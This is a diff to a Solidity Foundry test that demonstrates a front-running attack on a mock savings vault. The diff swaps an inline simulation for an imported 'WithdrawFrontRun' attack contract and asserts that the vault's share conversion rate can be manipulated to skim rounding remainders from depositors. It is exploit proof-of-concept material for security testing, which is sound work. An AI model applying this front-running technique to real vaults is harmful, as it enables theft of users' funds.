@@ -3,22 +3,23 @@ pragma solidity ^0.8.24;
 
 import "forge-std/Test.sol";
 import "../src/mocks/MockSavingsVault.sol";
+import "../src/attacks/withdraw_frontrun.sol";
 
 /**
  * @title WithdrawFrontrunTest
- * @notice Proves the `withdraw_frontrun` template inline: balance-based share
- *         pricing lets an attacker front-run a redemption to move the exchange
- *         rate and steal the rounding remainder from fresh deposits.
+ * @notice Proves the `withdraw_frontrun` TEMPLATE: the shipped
+ *         WithdrawFrontRun contract front-runs a redemption to move the
+ *         exchange rate and steal the rounding remainder from fresh deposits.
  */
 contract WithdrawFrontrunTest is Test {
     MockSavingsVault public vault;
-    address public attacker;
+    WithdrawFrontRun public attacker;
     address public victim;
 
     function setUp() public {
-        attacker = makeAddr("attacker");
         victim = makeAddr("victim");
         vault = new MockSavingsVault(address(this));
+        attacker = new WithdrawFrontRun(address(vault));
     }
 
     function testWithdrawFrontrun() public {
@@ -28,12 +29,9 @@ contract WithdrawFrontrunTest is Test {
         vault.deposit{value: 10 ether}(10 ether, victim);
         vm.stopPrank();
 
-        // attacker front-runs: deposits 5 ETH at the manipulated rate (mints
-        // shares at the inflated price), moving the conversion rate mid-flight
-        vm.deal(attacker, 5 ether);
-        vm.startPrank(attacker);
-        vault.deposit{value: 5 ether}(0, attacker);
-        vm.stopPrank();
+        // attacker front-runs: deposits 5 ETH at the manipulated rate
+        vm.deal(address(attacker), 5 ether);
+        attacker.frontRunDeposit(5 ether);
 
         // share price moved mid-transaction -> front-runnable conversion rate
         assertGt(vault.convertToAssets(1 ether), 1 ether, "conversion rate manipulable");
